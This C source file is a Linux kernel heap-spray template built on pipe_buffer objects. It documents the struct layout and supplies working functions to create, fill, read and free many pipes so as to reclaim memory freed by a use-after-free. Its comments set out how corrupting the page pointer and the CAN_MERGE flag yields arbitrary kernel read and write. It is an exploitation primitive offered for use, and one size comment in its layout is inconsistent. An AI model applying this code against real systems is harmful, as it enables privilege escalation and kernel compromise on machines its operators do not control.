/*
 * pipe_buffer Heap Spray Template
 *
 * struct pipe_buffer layout (40 bytes each, 16 per pipe default):
 *   0x00: struct page *page       (8 bytes - pointer to backing page)
 *   0x08: unsigned int offset     (4 bytes - offset within page)
 *   0x0c: unsigned int len        (4 bytes - length of data)
 *   0x10: const struct pipe_buf_operations *ops  (8 bytes - FUNCTION POINTERS)
 *   0x18: unsigned int flags      (4 bytes - PIPE_BUF_FLAG_*)
 *   0x1c: unsigned long private   (4 bytes)
 *
 * Key exploitation values:
 *   - page: Can be set to point at arbitrary struct page for read/write
 *   - ops: Contains function pointers (confirm, release, try_steal)
 *   - flags: PIPE_BUF_FLAG_CAN_MERGE (0x10) allows write via splice
 *
 * Allocation:
 *   - pipe_buffer array: 16 * 40 = 640 bytes -> kmalloc-1024 (with padding)
 *   - Each write to pipe allocates a backing page (order-0)
 *   - fcntl(F_SETPIPE_SZ) can resize pipe buffer array
 *
 * Common spray strategy:
 *   1. Create many pipes
 *   2. Write to each pipe to allocate pipe_buffer arrays + backing pages
 *   3. After UAF, reclaim freed object with pipe_buffer or backing page
 *   4. Read from pipe to leak data, or write to corrupt
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>

#define PIPE_SPRAY_COUNT  0x100   /* Number of pipe pairs to create */
#define PIPE_WRITE_SIZE   0x100   /* Bytes to write per pipe (allocates pages) */

struct pipe_pair {
    int fd[2];  /* fd[0] = read end, fd[1] = write end */
};

static struct pipe_pair pipes[PIPE_SPRAY_COUNT];

/* Create pipe pairs and optionally resize them */
int spray_pipes_create(int count, int pipe_size) {
    for (int i = 0; i < count && i < PIPE_SPRAY_COUNT; i++) {
        if (pipe(pipes[i].fd) < 0) {
            perror("pipe");
            return -1;
        }
        if (pipe_size > 0) {
            /* Resize pipe buffer array - changes kmalloc size
             * pipe_size must be power of 2, minimum PAGE_SIZE
             * e.g., pipe_size=PAGE_SIZE -> 1 buffer -> kmalloc-64
             * e.g., pipe_size=16*PAGE_SIZE -> 16 buffers (default) -> kmalloc-1024 */
            fcntl(pipes[i].fd[0], F_SETPIPE_SZ, pipe_size);
        }
    }
    return 0;
}

/* Write to pipes to allocate backing pages and fill pipe_buffer entries */
int spray_pipes_write(int count, void *data, size_t data_size) {
    char buf[PIPE_WRITE_SIZE];

    if (data && data_size > 0) {
        memset(buf, 0, sizeof(buf));
        memcpy(buf, data, data_size < sizeof(buf) ? data_size : sizeof(buf));
    } else {
        memset(buf, 'P', sizeof(buf));
    }

    for (int i = 0; i < count && i < PIPE_SPRAY_COUNT; i++) {
        if (write(pipes[i].fd[1], buf, sizeof(buf)) < 0) {
            perror("pipe write");
            return -1;
        }
    }
    return 0;
}

/* Read from pipe (consumes data, triggers pipe_buf_operations->release) */
int spray_pipes_read(int idx, void *buf, size_t size) {
    return read(pipes[idx].fd[0], buf, size);
}

/* Close specific pipe to free its pipe_buffer array + backing pages */
void spray_pipes_free_one(int idx) {
    close(pipes[idx].fd[0]);
    close(pipes[idx].fd[1]);
    pipes[idx].fd[0] = -1;
    pipes[idx].fd[1] = -1;
}

/* Close all pipes */
void spray_pipes_cleanup(int count) {
    for (int i = 0; i < count && i < PIPE_SPRAY_COUNT; i++) {
        if (pipes[i].fd[0] >= 0) {
            close(pipes[i].fd[0]);
            close(pipes[i].fd[1]);
        }
    }
}

/*
 * Advanced: Page-level reclamation via splice
 *
 * After UAF of a page, use splice to "claim" that page into a pipe:
 *   1. mmap a file-backed region
 *   2. splice(file_fd, ..., pipe_write_fd, ...) to link file pages into pipe
 *   3. If the freed page was reclaimed by the file, pipe now references it
 *   4. Read from pipe to leak page content
 *   5. Write to pipe (if CAN_MERGE) to modify page content
 *
 * For arbitrary kernel address read/write via pipe_buffer:
 *   1. Corrupt pipe_buffer->page to point at target struct page
 *   2. Corrupt pipe_buffer->flags |= PIPE_BUF_FLAG_CAN_MERGE
 *   3. splice() from pipe reads from target page
 *   4. write() to pipe writes to target page (if CAN_MERGE set)
 */

/*
 * Usage pattern:
 *
 * 1. spray_pipes_create(PIPE_SPRAY_COUNT, 0);       // Create pipes
 * 2. // ... trigger vulnerability to free object in target cache ...
 * 3. spray_pipes_write(PIPE_SPRAY_COUNT, NULL, 0);   // Reclaim with pages
 * 4. // ... for each pipe, read and check for corrupted data ...
 * 5. for (int i = 0; i < PIPE_SPRAY_COUNT; i++) {
 *        char buf[PIPE_WRITE_SIZE];
 *        spray_pipes_read(i, buf, sizeof(buf));
 *        if (contains_leak(buf)) { /* found it */ }
 *    }
 * 6. spray_pipes_cleanup(PIPE_SPRAY_COUNT);
 */
